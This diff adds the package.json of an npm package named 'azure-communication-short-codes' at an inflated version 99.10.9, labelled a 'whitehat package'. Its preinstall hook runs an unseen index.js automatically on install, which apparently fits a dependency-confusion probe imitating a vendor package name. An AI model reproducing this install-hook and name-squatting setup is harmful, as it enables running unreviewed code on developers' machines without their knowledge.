@@ -1,0 +1,39 @@
+{
+    "name": "azure-communication-short-codes",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-communication-short-codes@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-BuIjfpLw16pybgXQE//irZBr59KX41WjTVhPVwm9cdDrdUkbNiqaRirxKrxrcjv5E5iNVzHG1Xvja0CCx+onPA==",
+        "shasum": "d9e451a542d3cb416fd3631bd0f0311ca755bee7",
+        "tarball": "https://registry.npmjs.org/azure-communication-short-codes/-/azure-communication-short-codes-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3595,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhontuCRA9TVsSAnZWagAAB/4P/i/Chg+MKGl24c59dKCA\n/gQGJ8i2kz3wmK6BKCQC4+YguNejNZQNjjxRS51PQvWaeif0DS5hMqjrw+50\nkzYyZw/EaNKE1R5ksCIcufIy9W6Jq5ISfUiBypOLx+Ns4saBLuBP6f614yNf\nZJLmGF5iHPONs98RKmxYZ3BaTMYVEIikJNkt7CNGZhHCE9IPMRqxImPRgp9a\nL2GLfEUV7WEBVKtD3qGiJAqMygjFPI2GwQD2XEkATB3iWMhss0jjaeAcn3vh\nDPoLSOuEzpXwzcUyujl92HNgfZ5qO4HO2vpO0n57OtVOTGM9YptuurbAv0m5\nRV56ZLzRXmM1vhXV/06zXGgjXqH2AdesjAb2MJZ0paTS3XfR8uY/D//AsqGg\ndApEa+xz1f0Jco2tk47KLLGhthJC29cIyH6he+DkYjLBgWzPZnU2EkYkfHMq\n6nX/QfJ5RQqilrjfW4W98VtiwfC6rSSd+TYHr4Ay0K+X95s00oz96sESf7Py\nbLSCYzDpi7DnvAKkIPIKHg4k8tC8YVX6Jd7tkpdY7Gvx4eND9MUPcn313ZlR\ndMmMDdAeIJ7d8Rmi/gDuJ5rOPAZMXBZuvxXoyasVEA76B9SpdeS3WB9A8vHK\nqhnqf5Iis6l15St6hUenR96u3EKnQ/Bcp61koXxK9wnXw2ZHa5KNIg3o8h7i\nCxPG\r\n=yO+4\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-communication-short-codes_99.10.9_1638038382829_0.8013937285247184"
+    },
+    "_hasShrinkwrap": false
+}
